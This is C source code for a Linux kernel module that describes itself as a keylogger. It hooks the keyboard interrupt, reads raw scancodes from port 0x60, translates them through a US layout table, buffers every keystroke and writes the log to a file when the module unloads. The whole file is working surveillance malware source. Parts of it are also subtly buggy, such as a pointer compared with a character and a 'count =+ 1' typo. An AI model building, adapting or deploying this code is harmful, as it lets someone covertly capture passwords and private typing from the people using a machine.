#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/mutex.h>
//#include <sharedVariable.h>

#ifndef __KERNEL__
#define __KERNEL__
#endif

// keyboard constants/variables
#define KBD_INPUT_PORT	0x60    /* address of keyboard input buffer */
#define LEFT_SHIFT 0x2a
#define RIGHT_SHIFT 0x36
#define LEFT_SHIFT_RELEASE 0xaa
#define RIGHT_SHIFT_RELEASE 0xb6
int shiftPressed = 0;

// output constants/variables
#define OUTPUT_MODE 0644
const char* path = "./output.txt"; //temporary
struct file *outfile;
int count = 0;
//char* path;

// character buffer constants
#define B_SIZE 1000
char* char_buffer[B_SIZE];
int pos = 0;
int rollover = 0;

// FUNCTION PROTOTYPES
struct file *createFile(const char *path);
int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
void closeFile(struct file *file);
static irqreturn_t get_scancode(int irq, void *dev_id);
void scancode_to_key(char scancode);
void check_shift(unsigned char scancode);
void write_buffer_to_output(void);
char* generate_timestamp(void);

//Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard

const char *scancodes[][2] = {
  {"/0", "/0"}, {"/e", "/e"}, {"1", "!"}, {"2", "@"}, {"3", "#"},
  {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"},
  {"9", "("}, {"0", ")"}, {"-","_"}, {"=", "+"}, {"/b", "/b"},
  {"/t", "/t"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r","R"}, {"t", "T"},
  {"y", "Y"}, {"u", "U"}, {"i","I"}, {"o", "O"}, {"p", "P"}, {"[", "{"},
  {"]", "}"}, {"/n", "/n"}, {"LCtrl", "LCtrl"}, {"a", "A"}, {"s", "S"}, {"d", "D"},
  {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
  {";", ":"}, {"\'", "\""}, {"`", "~"},{"LShift", "LShift"}, {"\\", "|"},
  {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"},
  {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"RShift", "RShift"},
  {"PrtScn", "KeyPad"},{"LAlt", "LAlt"}, {" ", " "}, {"CapsLock", "CapsLock"},
  {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
  {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"},
  {"NumLock", "NumLock"}, {"ScrollLock", "ScrollLock"}, {"Keypad-7", "Home"},
  {"Keypad-8", "Up"}, {"Keypad-9", "PgUp"},{"-", "-"}, {"Keypad-4", "Left"},
  {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},
  {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
  {"Keypad-", "Del"}, {"Alt-SysRq", "Alt-SysRq"}, {"\0", "\0"},{"\0", "\0"},
  {"F11", "F11"}, {"F12", "F12"} };                                

//Creating the output file
struct file *createFile(const char *path) 
{
    struct file *fileP = NULL;
    mm_segment_t oldFileSpace;
    int err = 0;

    oldFileSpace = get_fs();
    set_fs(get_ds());
    fileP = filp_open(path, O_CREAT | O_APPEND | O_WRONLY, OUTPUT_MODE);
    set_fs(oldFileSpace);
    if (IS_ERR(fileP)) {
        err = PTR_ERR(fileP);
        return NULL;
    }
    return fileP;
}

//Write to the output file
int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
	mm_segment_t oldFileSpace;
    int ret;

    oldFileSpace = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldFileSpace);
    return ret;
}

void closeFile(struct file *file) 
{
    filp_close(file, NULL);
}

// gets the scancode of each pressed key
static irqreturn_t get_scancode(int irq, void *dev_id)
{
	unsigned char scancode;
	scancode = inb(KBD_INPUT_PORT);
	check_shift(scancode);
	scancode_to_key(scancode);
    return IRQ_HANDLED;
}

void scancode_to_key(char scancode)
{
	if (scancodes[scancode][0] != '\0')
	{
		printk("%s\n", scancodes[scancode][shiftPressed]);
		char_buffer[pos] = scancodes[scancode][shiftPressed];
		//printk("%s\n", char_buffer[pos]);
		pos++;
		if (pos >= B_SIZE) 
		{
			pos = 0;
			rollover++;
		}
	}
}

void check_shift(unsigned char scancode)
{
	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
	{
		shiftPressed = 1;
	}

	if (scancode == LEFT_SHIFT_RELEASE || scancode == RIGHT_SHIFT_RELEASE)
	{
		shiftPressed = 0;
	}
}

// writes all the characters stored in the buffer to the output file
void write_buffer_to_output(void)
{
	int i = 0;
	int max_size = B_SIZE;

	if (rollover == 0)
	{
		max_size = pos;
	}

	while (i < max_size)
	{
		writeToFile(outfile, 0, char_buffer[i], 1);
		if(char_buffer[i]  == " " || char_buffer[i] == "/L"){
		  count =+ 1;
		}
		i++;
	}

	printk("Character buffer written to output.\n");
}

char* generate_timestamp(void)
{
	long total_sec;
	int hr, min, sec;
    struct timeval time;
	char timestamp[10];

    do_gettimeofday(&time);
	total_sec = time.tv_sec;

	sec = total_sec % 60;
	min = (total_sec / 60) % 60;
	hr = (((total_sec / 3600) / 365) % 24) - 1;

	// build timestamp string
	sprintf(timestamp, "[%d:%d:%d]", hr, min, sec);
	printk("Time: %s", timestamp);
	return *timestamp;
}
  
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel-based keylogger module");

int __init init_keylogger(void)
{
	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
	generate_timestamp();
	outfile = createFile(path);
	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
	return 0;
}

void __exit exit_module(void)
{
	printk(KERN_INFO "Exiting keylogger kernel module.\n");
	free_irq(1, (void *)get_scancode);
	write_buffer_to_output();
	closeFile(outfile);
	return;
}

module_init(init_keylogger);
module_exit(exit_module);
